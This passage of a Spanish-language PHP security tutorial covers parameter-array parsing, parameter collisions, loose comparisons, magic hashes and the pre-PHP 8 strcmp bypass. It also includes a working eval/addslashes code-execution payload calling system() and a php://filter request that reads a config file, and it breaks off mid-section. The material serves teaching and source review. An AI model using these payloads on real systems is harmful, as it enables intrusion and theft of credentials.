+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#FF7B72">GET</span><span style="color:#E6EDF3"> /?role[]=admin </span><span style="color:#FF7B72">HTTP</span><span style="color:#E6EDF3">/</span><span style="color:#79C0FF">1.1</span></span>
+<span class="line"><span style="color:#7EE787">Host</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> target</span></span></code></pre>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>array(1) {</span></span>
+<span class="line"><span>  [0]=></span></span>
+<span class="line"><span>  string(5) "admin"</span></span>
+<span class="line"><span>}</span></span></code></pre>
+<p>También pueden construirse keys:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#FF7B72">GET</span><span style="color:#E6EDF3"> /?role[level]=admin </span><span style="color:#FF7B72">HTTP</span><span style="color:#E6EDF3">/</span><span style="color:#79C0FF">1.1</span></span>
+<span class="line"><span style="color:#7EE787">Host</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> target</span></span></code></pre>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>array(1) {</span></span>
+<span class="line"><span>  ["level"]=></span></span>
+<span class="line"><span>  string(5) "admin"</span></span>
+<span class="line"><span>}</span></span></code></pre>
+<p>Cuando un valor atraviesa validación, autorización, comparación o una función que espera un scalar, merece la pena probar variaciones como:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>id=1</span></span>
+<span class="line"><span>id[]=1</span></span>
+<span class="line"><span>id[x]=1</span></span></code></pre>
+<aside class="pub-callout note" role="note"><strong class="pub-callout-title">Señal útil en black-box</strong><p>Un <code>500</code> no es el objetivo del probe. Un cambio de rama, un error distinto, una respuesta de validación diferente o un <code>TypeError</code> puede revelar qué representación ha alcanzado el código y orientar la siguiente prueba.</p></aside>
+<h3 id="parámetros-duplicados-y-colisiones-scalar-array">Parámetros duplicados y colisiones scalar-array</h3>
+<p>PHP también tiene que resolver parámetros repetidos. Con el parser de PHP 8.4.23:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>role=user&#x26;role=admin</span></span>
+<span class="line"><span>→ role = "admin"</span></span></code></pre>
+<p>Utilizar explícitamente arrays conserva ambos valores:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>role[]=user&#x26;role[]=admin</span></span>
+<span class="line"><span>→ role = ["user", "admin"]</span></span></code></pre>
+<p>Mezclar las dos representaciones cambia tanto el valor como el tipo final:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>role=user&#x26;role[]=admin</span></span>
+<span class="line"><span>→ role = ["admin"]</span></span></code></pre>
+<p>El orden inverso produce:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>role[]=admin&#x26;role=user</span></span>
+<span class="line"><span>→ role = "user"</span></span></code></pre>
+<p>Un conjunto pequeño de variantes cubre los casos principales:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>param=a&#x26;param=b</span></span>
+<span class="line"><span>param=a&#x26;param[]=b</span></span>
+<span class="line"><span>param[]=a&#x26;param=b</span></span>
+<span class="line"><span>param[]=a&#x26;param[]=b</span></span></code></pre>
+<p>Este comportamiento resulta especialmente interesante cuando un proxy, WAF, framework o capa de validación interpreta los parámetros antes de que PHP construya <code>$_GET</code> o <code>$_POST</code>. Si las capas seleccionan ocurrencias diferentes, el valor validado puede no coincidir con el que termina utilizando la aplicación.</p>
+<h3 id="normalización-de-nombres-de-parámetros">Normalización de nombres de parámetros</h3>
+<p>PHP modifica algunos nombres externos antes de exponerlos al código.</p>
+<p>Los puntos y espacios se convierten en underscores:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>user.name=guest</span></span></code></pre>
+<p>termina accesible como:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#E6EDF3">$_GET[</span><span style="color:#A5D6FF">'user_name'</span><span style="color:#E6EDF3">]</span></span></code></pre>
+<p>Esto permite colisiones entre nombres HTTP distintos:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>user.name=guest&#x26;user_name=admin</span></span></code></pre>
+<p>que terminan resolviéndose sobre la misma key PHP.</p>
+<p>La bracket notation tiene otro comportamiento relevante. Si el nombre empieza con una sintaxis de array válida, los caracteres posteriores pueden ignorarse:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>foo[bar]suffix=value</span></span></code></pre>
+<p>se interpreta como:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#E6EDF3">$_GET[</span><span style="color:#A5D6FF">'foo'</span><span style="color:#E6EDF3">][</span><span style="color:#A5D6FF">'bar'</span><span style="color:#E6EDF3">] </span><span style="color:#FF7B72">===</span><span style="color:#A5D6FF"> 'value'</span></span></code></pre>
+<p>Estos casos son útiles cuando una capa filtra o valida el nombre original del parámetro y otra trabaja con la representación ya normalizada por PHP.</p>
+<h3 id="precedencia-de-_request">Precedencia de <code>$_REQUEST</code></h3>
+<p><code>$_GET</code> y <code>$_POST</code> mantienen separados sus orígenes. <code>$_REQUEST</code> puede combinar GET, POST y, según configuración, cookies.</p>
+<p>Si el código utiliza:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#FF7B72">&#x3C;?</span><span style="color:#79C0FF">php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">$role </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $_REQUEST[</span><span style="color:#A5D6FF">'role'</span><span style="color:#E6EDF3">];</span></span></code></pre>
+<p>conviene probar valores diferentes por canales distintos:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#FF7B72">POST</span><span style="color:#E6EDF3"> /action?role=user </span><span style="color:#FF7B72">HTTP</span><span style="color:#E6EDF3">/</span><span style="color:#79C0FF">1.1</span></span>
+<span class="line"><span style="color:#7EE787">Host</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> target</span></span>
+<span class="line"><span style="color:#7EE787">Content-Type</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> application/x-www-form-urlencoded</span></span>
+<span class="line"><span style="color:#7EE787">Content-Length</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> 10</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">role=admin</span></span></code></pre>
+<p>El valor efectivo depende de <code>request_order</code> y, si no está definido, de <code>variables_order</code>. PHP registra las fuentes de izquierda a derecha y los valores posteriores sobrescriben a los anteriores.</p>
+<p>Este probe tiene sentido cuando el código utiliza <code>$_REQUEST</code>, cuando varias capas construyen parámetros desde fuentes diferentes o cuando la procedencia esperada de un valor no está clara.</p>
+<h2 id="comparaciones-laxas">Comparaciones laxas</h2>
+<p>PHP dispone de comparaciones estrictas y no estrictas:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#E6EDF3">$value </span><span style="color:#FF7B72">==</span><span style="color:#E6EDF3"> $expected;</span></span>
+<span class="line"><span style="color:#E6EDF3">$value </span><span style="color:#FF7B72">===</span><span style="color:#E6EDF3"> $expected;</span></span></code></pre>
+<p><code>===</code> exige que valor y tipo coincidan. <code>==</code> puede aplicar conversiones antes de comparar.</p>
+<p>PHP 8 cambió varias reglas históricas, especialmente las comparaciones entre números y strings no numéricos:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>PHP 7.x</span></span>
+<span class="line"><span>0 == "foo"</span></span>
+<span class="line"><span>→ true</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>PHP 8+</span></span>
+<span class="line"><span>0 == "foo"</span></span>
+<span class="line"><span>→ false</span></span></code></pre>
+<p>El cambio eliminó varios payloads clásicos. Las numeric strings y otras comparaciones coercitivas siguen siendo relevantes.</p>
+<h3 id="strings-numéricos-y-magic-hashes">Strings numéricos y magic hashes</h3>
+<p>Cuando dos strings tienen una representación numérica válida, una comparación laxa puede compararlas numéricamente.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#FF7B72">&#x3C;?</span><span style="color:#79C0FF">php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79C0FF">var_dump</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"0e123"</span><span style="color:#FF7B72"> ==</span><span style="color:#A5D6FF"> "000"</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"><span style="color:#79C0FF">var_dump</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"2e1"</span><span style="color:#FF7B72"> ==</span><span style="color:#A5D6FF"> "020"</span><span style="color:#E6EDF3">);</span></span></code></pre>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>bool(true)</span></span>
+<span class="line"><span>bool(true)</span></span></code></pre>
+<p>La <code>e</code> puede representar notación científica:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>0e123 → 0 × 10^123 → 0</span></span>
+<span class="line"><span>2e1   → 2 × 10^1   → 20</span></span></code></pre>
+<p>Esto mantiene vigente la familia de problemas conocida como <strong>magic hashes</strong> cuando el código compara laxamente valores con una forma compatible.</p>
+<p>Dos inputs clásicos de MD5 producen hashes diferentes:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#FF7B72">&#x3C;?</span><span style="color:#79C0FF">php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">$a </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> md5</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'240610708'</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"><span style="color:#E6EDF3">$b </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> md5</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'QNKCDZO'</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79C0FF">var_dump</span><span style="color:#E6EDF3">($a);</span></span>
+<span class="line"><span style="color:#79C0FF">var_dump</span><span style="color:#E6EDF3">($b);</span></span>
+<span class="line"><span style="color:#79C0FF">var_dump</span><span style="color:#E6EDF3">($a </span><span style="color:#FF7B72">==</span><span style="color:#E6EDF3"> $b);</span></span>
+<span class="line"><span style="color:#79C0FF">var_dump</span><span style="color:#E6EDF3">($a </span><span style="color:#FF7B72">===</span><span style="color:#E6EDF3"> $b);</span></span></code></pre>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>string(32) "0e462097431906509019562988736854"</span></span>
+<span class="line"><span>string(32) "0e830400451993494058024219903391"</span></span>
+<span class="line"><span>bool(true)</span></span>
+<span class="line"><span>bool(false)</span></span></code></pre>
+<p>El probe sólo tiene sentido si los valores alcanzan una comparación no estricta y ambos son interpretables como numeric strings compatibles. Encontrar un hash que empieza por <code>0e</code> no implica por sí solo un bypass.</p>
+<p>En source review merece atención el uso de <code>==</code> o <code>!=</code> sobre hashes, tokens, identificadores o valores derivados de transformaciones.</p>
+<h3 id="comprobaciones-laxas-de-pertenencia">Comprobaciones laxas de pertenencia</h3>
+<p>Algunas APIs mantienen comparación laxa como comportamiento por defecto.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#FF7B72">&#x3C;?</span><span style="color:#79C0FF">php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">$allowed </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">];</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79C0FF">var_dump</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">in_array</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'0'</span><span style="color:#E6EDF3">, $allowed));</span></span>
+<span class="line"><span style="color:#79C0FF">var_dump</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">in_array</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'0'</span><span style="color:#E6EDF3">, $allowed, </span><span style="color:#79C0FF">true</span><span style="color:#E6EDF3">));</span></span></code></pre>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>bool(true)</span></span>
+<span class="line"><span>bool(false)</span></span></code></pre>
+<p>Sin el tercer argumento <code>true</code>, <code>in_array()</code> utiliza comparación no estricta.</p>
+<p>PHP 8 eliminó algunos edge cases históricos como consecuencia de las nuevas reglas string-number, pero <code>strict=false</code> sigue permitiendo coerción. Durante source review interesa revisar tanto operadores como APIs que aplican estas comparaciones internamente.</p>
+<h3 id="valores-falsey-y-valores-centinela">Valores falsey y valores centinela</h3>
+<p>Algunas construcciones PHP tratan valores aparentemente válidos como falsey.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#79C0FF">empty</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"0"</span><span style="color:#E6EDF3">)</span></span></code></pre>
+<p>devuelve:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>true</span></span></code></pre>
+<p>También hay funciones que utilizan <code>false</code> como sentinel pero pueden devolver un valor válido igual a <code>0</code>.</p>
+<p><code>strpos()</code> devuelve la posición de una coincidencia empezando por cero, o <code>false</code> si no existe. Código como:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#FF7B72">&#x3C;?</span><span style="color:#79C0FF">php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">if</span><span style="color:#E6EDF3"> (</span><span style="color:#79C0FF">strpos</span><span style="color:#E6EDF3">($input, </span><span style="color:#A5D6FF">'../'</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">==</span><span style="color:#79C0FF"> false</span><span style="color:#E6EDF3">) {</span></span>
+<span class="line"><span style="color:#D2A8FF">    process</span><span style="color:#E6EDF3">($input);</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span></code></pre>
+<p>puede confundir ambos estados.</p>
+<p>Con:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>../etc/passwd</span></span></code></pre>
+<p>la cadena prohibida aparece en la posición cero:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#79C0FF">strpos</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'../etc/passwd'</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">'../'</span><span style="color:#E6EDF3">)</span></span></code></pre>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>int(0)</span></span></code></pre>
+<p>y la comparación:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#79C0FF">0</span><span style="color:#FF7B72"> ==</span><span style="color:#79C0FF"> false</span></span></code></pre>
+<p>es verdadera.</p>
+<p>El mismo error aparece con patrones como:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#FF7B72">if</span><span style="color:#E6EDF3"> (</span><span style="color:#FF7B72">!</span><span style="color:#79C0FF">strpos</span><span style="color:#E6EDF3">($input, </span><span style="color:#A5D6FF">'../'</span><span style="color:#E6EDF3">)) {</span></span>
+<span class="line"><span style="color:#FF7B72">    ...</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span></code></pre>
+<p>Cuando una API puede devolver <code>0</code> o <code>false</code>, hay que revisar cómo se consume el resultado antes de asumir que ambos estados están distinguidos.</p>
+<details>
+<summary><strong>Histórico: <code>password[]=</code> + <code>strcmp()</code> antes de PHP 8</strong></summary>
+<p>Un bypass clásico combinaba el parser de arrays con el comportamiento histórico de las funciones internas.</p>
+<p>Código vulnerable:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#FF7B72">&#x3C;?</span><span style="color:#79C0FF">php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">if</span><span style="color:#E6EDF3"> (</span><span style="color:#79C0FF">strcmp</span><span style="color:#E6EDF3">($_POST[</span><span style="color:#A5D6FF">'password'</span><span style="color:#E6EDF3">], $PASS) </span><span style="color:#FF7B72">==</span><span style="color:#79C0FF"> 0</span><span style="color:#E6EDF3">) {</span></span>
+<span class="line"><span style="color:#D2A8FF">    login</span><span style="color:#E6EDF3">();</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span></code></pre>
+<p>El request:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#FF7B72">POST</span><span style="color:#E6EDF3"> /login </span><span style="color:#FF7B72">HTTP</span><span style="color:#E6EDF3">/</span><span style="color:#79C0FF">1.1</span></span>
+<span class="line"><span style="color:#7EE787">Host</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> target</span></span>
+<span class="line"><span style="color:#7EE787">Content-Type</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> application/x-www-form-urlencoded</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">password[]=</span></span></code></pre>
+<p>hacía que PHP proporcionara un array:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#E6EDF3">$_POST[</span><span style="color:#A5D6FF">'password'</span><span style="color:#E6EDF3">]</span></span>
+<span class="line"><span style="color:#79C0FF">→</span><span style="color:#79C0FF"> array</span><span style="color:#E6EDF3">()</span></span></code></pre>
+<p>Antes de PHP 8, muchas funciones internas manejaban tipos de argumento inválidos emitiendo un warning y devolviendo <code>NULL</code>. La cadena explotable era:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>password[]=</span></span>
+<span class="line"><span>     ↓</span></span>
+<span class="line"><span>array()</span></span>
+<span class="line"><span>     ↓</span></span>
+<span class="line"><span>strcmp(array(), $PASS)</span></span>
+<span class="line"><span>     ↓</span></span>
+<span class="line"><span>warning + NULL</span></span>
+<span class="line"><span>     ↓</span></span>
+<span class="line"><span>NULL == 0</span></span>
+<span class="line"><span>     ↓</span></span>
+<span class="line"><span>true</span></span></code></pre>
+<p>PHP 8 hizo consistentes estos errores de tipo. <code>strcmp()</code> espera strings y pasarle un array provoca un <code>TypeError</code>.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>PHP &#x3C; 8</span></span>
+<span class="line"><span>array → strcmp() → NULL → posible bypass</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>PHP 8+</span></span>
+<span class="line"><span>array → strcmp() → TypeError</span></span></code></pre>
+<p><code>password[]=</code> continúa siendo un probe válido para observar cómo la aplicación maneja un cambio de scalar a array. El bypass específico basado en <code>strcmp() → NULL</code> pertenece al comportamiento anterior a PHP 8.</p>
+</details>
+<h2 id="evaluación-dinámica">Evaluación dinámica</h2>
+<p><code>eval()</code> interpreta un string como código PHP. Cuando parte de ese string depende del usuario, la explotación está determinada por el código final que recibe el parser.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>input</span></span>
+<span class="line"><span>  ↓</span></span>
+<span class="line"><span>transformations</span></span>
+<span class="line"><span>  ↓</span></span>
+<span class="line"><span>generated PHP</span></span>
+<span class="line"><span>  ↓</span></span>
+<span class="line"><span>eval()</span></span>
+<span class="line"><span>  ↓</span></span>
+<span class="line"><span>PHP parser</span></span></code></pre>
+<h3 id="contexto-del-código-generado">Contexto del código generado</h3>
+<p>Considera:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#FF7B72">&#x3C;?</span><span style="color:#79C0FF">php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">$input </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $_GET[</span><span style="color:#A5D6FF">'param'</span><span style="color:#E6EDF3">] </span><span style="color:#FF7B72">??</span><span style="color:#A5D6FF"> ''</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">$code </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> '$value = "'</span><span style="color:#FF7B72"> .</span><span style="color:#E6EDF3"> $input </span><span style="color:#FF7B72">.</span><span style="color:#A5D6FF"> '";'</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79C0FF">eval</span><span style="color:#E6EDF3">($code);</span></span></code></pre>
+<p>El input no se inserta simplemente en un <code>eval</code>. Termina dentro de una string PHP entre comillas dobles que forma parte del código generado.</p>
+<p>Antes de construir un payload hay que reconstruir ese contexto: delimitadores, concatenaciones, funciones aplicadas y gramática válida después de las transformaciones.</p>
+<h3 id="addslashes-e-interpolación-de-strings"><code>addslashes()</code> e interpolación de strings</h3>
+<p><code>addslashes()</code> añade backslashes delante de:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>'</span></span>
+<span class="line"><span>"</span></span>
+<span class="line"><span>\</span></span>
+<span class="line"><span>NUL</span></span></code></pre>
+<p>No transforma <code>$</code>, <code>{</code> ni <code>}</code>, que forman parte de la sintaxis de interpolación de strings de PHP.</p>
+<p>Con:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#FF7B72">&#x3C;?</span><span style="color:#79C0FF">php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">$input </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> addslashes</span><span style="color:#E6EDF3">($_GET[</span><span style="color:#A5D6FF">'param'</span><span style="color:#E6EDF3">] </span><span style="color:#FF7B72">??</span><span style="color:#A5D6FF"> ''</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"><span style="color:#E6EDF3">$code </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> '$value = "'</span><span style="color:#FF7B72"> .</span><span style="color:#E6EDF3"> $input </span><span style="color:#FF7B72">.</span><span style="color:#A5D6FF"> '";'</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79C0FF">eval</span><span style="color:#E6EDF3">($code);</span></span></code></pre>
+<p>una variante reproducible en PHP 8.4.23 es:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#FF7B72">GET</span><span style="color:#E6EDF3"> /?param={${system($_GET[1])}}&#x26;1=id </span><span style="color:#FF7B72">HTTP</span><span style="color:#E6EDF3">/</span><span style="color:#79C0FF">1.1</span></span>
+<span class="line"><span style="color:#7EE787">Host</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> target</span></span></code></pre>
+<p>El código generado contiene:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#E6EDF3">$value </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> "{${</span><span style="color:#79C0FF">system</span><span style="color:#A5D6FF">(</span><span style="color:#E6EDF3">$_GET</span><span style="color:#A5D6FF">[</span><span style="color:#79C0FF">1</span><span style="color:#A5D6FF">])}}"</span><span style="color:#E6EDF3">;</span></span></code></pre>
+<p>La expresión <code>system($_GET[1])</code> se evalúa mientras PHP resuelve la variable variable dentro de la string interpolada. El comando se ejecuta aunque después pueda aparecer un warning porque el resultado de <code>system()</code> también se utiliza como nombre de variable.</p>
+<p>El índice numérico evita depender de bareword array keys como <code>$_GET[cmd]</code>, que en PHP 8 provocan un error por constante indefinida.</p>
+<p>La antigua forma de interpolación:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">${expression}</span><span style="color:#A5D6FF">"</span></span></code></pre>
+<p>quedó deprecada en PHP 8.2. La construcción anterior utiliza la forma potente <code>{$...}</code> con una variable variable anidada:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#A5D6FF">"{${</span><span style="color:#79C0FF">expression</span><span style="color:#A5D6FF">}}"</span></span></code></pre>
+<p>La condición sigue siendo específica: el dato controlado debe terminar dentro de una string interpolada que después sea evaluada. Comillas simples, otra concatenación o transformaciones diferentes cambian la gramática y requieren un payload distinto.</p>
+<p>El análisis útil de <code>addslashes()</code> consiste en identificar qué caracteres modifica y qué sintaxis válida sobrevive a esa transformación.</p>
+<h2 id="wrappers-de-streams">Wrappers de streams</h2>
+<p>Muchas funciones de filesystem de PHP trabajan con <strong>streams</strong>. Un valor que visualmente parece un filename puede resolverse mediante un esquema:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>scheme://...</span></span></code></pre>
+<p>Cuando un path depende del usuario, probar sólo rutas locales deja fuera comportamientos propios de PHP. El wrapper útil depende del sink: <code>include()</code>, <code>file_get_contents()</code>, <code>fopen()</code>, <code>file()</code>, <code>copy()</code> y otras operaciones no consumen el stream de la misma manera.</p>
+<h3 id="phpfilter"><code>php://filter</code></h3>
+<p><code>php://filter</code> aplica filtros a un stream en el momento de abrirlo.</p>
+<p>Ante:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#FF7B72">&#x3C;?</span><span style="color:#79C0FF">php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">include</span><span style="color:#E6EDF3">($_GET[</span><span style="color:#A5D6FF">'page'</span><span style="color:#E6EDF3">]);</span></span></code></pre>
+<p>un probe habitual es:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#FF7B72">GET</span><span style="color:#E6EDF3"> /?page=php://filter/convert.base64-encode/resource=/var/www/html/config.php </span><span style="color:#FF7B72">HTTP</span><span style="color:#E6EDF3">/</span><span style="color:#79C0FF">1.1</span></span>
+<span class="line"><span style="color:#7EE787">Host</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> target</span></span></code></pre>
+<p>En lugar de entregar directamente el contenido de <code>config.php</code> al parser como código PHP, el wrapper pasa sus bytes por el filtro Base64.</p>
+<p>Un resultado interesante tiene esta forma:</p>
